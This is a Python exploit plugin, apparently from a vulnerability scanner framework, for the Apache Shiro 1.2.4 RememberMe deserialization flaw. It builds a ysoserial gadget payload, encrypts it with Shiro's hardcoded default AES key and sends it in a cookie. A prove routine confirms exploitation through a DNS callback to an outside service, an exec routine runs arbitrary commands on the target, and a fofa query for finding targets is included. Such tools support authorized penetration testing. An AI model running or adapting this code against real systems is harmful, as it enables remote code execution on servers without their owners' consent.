#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import os
import time
import base64
import uuid
import subprocess
from Crypto.Cipher import AES
from script import Script, SERVICE_PORT_MAP
from lib.core.data import paths

class POC(Script):
    '''
    fofa: header="rememberMe"
    '''
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'apache shiro rememberme rce'
        self.keyword = ['shiro', 'apache']
        self.info = 'Apache Shiro 1.2.4 RememberMe RCE'
        self.type = 'rce'
        self.level = 'high'
        self.refer = 'https://paper.seebug.org/shiro-rememberme-1-2-4/'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './shiro/'),
                self.url_normpath(self.base_url, '/shiro/'),
                self.url_normpath(self.url, './'),
                self.url_normpath(self.url, '')
            ]))
            dns = self.ceye_dns_api(t='dns')
            cmd = 'ping '+ dns
            payload = self.encode_rememberme(cmd)
            headers = {
                "Cookie": "rememberMe={}".format(payload.decode())
            }
            for path in path_list:
                url = path
                res = self.curl('get', url, headers=headers)
                time.sleep(3)
                if self.ceye_verify_api(dns, t='dns'):
                    self.flag = 1
                    self.req.append({"cmd": cmd})
                    self.res.append({"info": "Success", "key": "Apache Shiro RememberMe RCE"})

    def exec(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './shiro/'),
                self.url_normpath(self.base_url, '/shiro/'),
                self.url_normpath(self.url, './'),
            ]))
            cmd = self.parameter['cmd']
            payload = encode_rememberme(cmd)
            headers = {
                "Cookie": "rememberMe={}".format(payload.decode())
            }
            for path in path_list:
                url = path
                try:
                    res = self.curl('get',url ,headers = headers)
                    if res and res.status_code is 200:
                        self.flag = 1
                        self.req.append({"cmd": cmd})
                        self.res.append({"info": "Success", "key": cmd})
                except Exception:
                    pass

    def encode_rememberme(self, command):
        try:
            popen = subprocess.Popen(['java', '-jar', os.path.join(paths.TOOL_PATH,'ysoserial.jar'), 'CommonsCollections2', command], stdout=subprocess.PIPE)
        except Exception as e:
            if "FileNotFoundError" in str(e):
                raise FileNotFoundError("FileNotFoundError.")

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        key  =  "kPH+bIxk5D2deZiIxcaaaA=="
        mode =  AES.MODE_CBC
        iv   =  uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext